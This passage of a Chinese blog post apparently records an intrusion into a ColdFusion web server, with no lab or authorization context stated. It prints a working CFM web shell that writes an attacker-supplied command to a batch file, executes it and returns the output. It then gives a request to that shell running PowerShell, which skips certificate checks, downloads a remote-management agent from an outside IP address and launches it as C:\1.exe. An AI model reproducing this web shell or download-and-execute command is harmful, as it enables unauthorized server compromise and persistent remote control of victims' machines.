+<p>构造本地执行bat文件，然后保存至txt文件中的木马，然后再次上传，成功</p>
+<p><img src="/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-59-21-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>木马如下（需要网站路径）：</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">cfparam</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;URL.c&quot;</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfif</span> <span class="hljs-attr">URL.c</span> <span class="hljs-attr">eq</span> &quot;&quot;&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cfoutput</span>&gt;</span>Usage: ?c=whoami<span class="hljs-tag">&lt;/<span class="hljs-name">cfoutput</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cfabort</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">cfif</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">cfset</span> <span class="hljs-attr">basePath</span> = <span class="hljs-string">&quot;C:\inetpub\wwwroot\Sites\TenantBackgroundSearch\blog\&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfset</span> <span class="hljs-attr">batFile</span> = <span class="hljs-string">basePath</span> &amp; &quot;<span class="hljs-attr">run.bat</span>&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfset</span> <span class="hljs-attr">outFile</span> = <span class="hljs-string">basePath</span> &amp; &quot;<span class="hljs-attr">out.txt</span>&quot;&gt;</span><br><br><span class="hljs-comment">&lt;!--- 构建批处理文件内容（使用 chr(13)chr(10) 换行，避免 &amp; # 等字符）---&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfset</span> <span class="hljs-attr">batContent</span> = <span class="hljs-string">&quot;@echo off&quot;</span> &amp; <span class="hljs-attr">chr</span>(<span class="hljs-attr">13</span>) &amp; <span class="hljs-attr">chr</span>(<span class="hljs-attr">10</span>) &amp; <span class="hljs-attr">URL.c</span> &amp; &quot; &gt;</span> &quot; &amp; outFile &amp; &quot; 2&gt;&amp;1&quot;&gt;<br><br><span class="hljs-comment">&lt;!--- 写入批处理文件 ---&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cffile</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;write&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;#batFile#&quot;</span> <span class="hljs-attr">output</span>=<span class="hljs-string">&quot;#batContent#&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--- 执行批处理文件（cfexecute 标签）---&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfexecute</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;#batFile#&quot;</span> <span class="hljs-attr">timeout</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!--- 读取输出文件 ---&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfif</span> <span class="hljs-attr">fileExists</span>(<span class="hljs-attr">outFile</span>)&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cffile</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;read&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;#outFile#&quot;</span> <span class="hljs-attr">variable</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cfoutput</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>#result#<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cfoutput</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cffile</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;#outFile#&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cfelse</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cfoutput</span>&gt;</span>执行完成，但未生成输出文件（可能命令被拦截或权限不足）<span class="hljs-tag">&lt;/<span class="hljs-name">cfoutput</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">cfif</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--- 清理批处理文件 ---&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cffile</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;#batFile#&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>发现拥有内网环境，上传木马。。。</p>
+<p>http:&#x2F;&#x2F;目标IP&#x2F;blog&#x2F;3.cfm?c&#x3D;powershell%20-Command%20%22%24wc%3DNew-Object%20Net.WebClient%3B%20%5BNet.ServicePointManager%5D%3A%3AServerCertificateValidationCallback%3D%7B%24true%7D%3B%20%24wc.DownloadFile%28%27https%3A%2F%2F188.212.124.154%3A4434%2Fmeshagents%3Fid%3D4%26meshid%3DodzOZvhk4Dsw7ioU7%24jyFnzl5R9umqbwSHhSwOyj8MiK%40Eht3JiUQazApcScKu6k%26installflags%3D0%27%2C%20%27C%3A%5C1.exe%27%29%3B%20Start-Process%20C%3A%5C1.exe%22</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
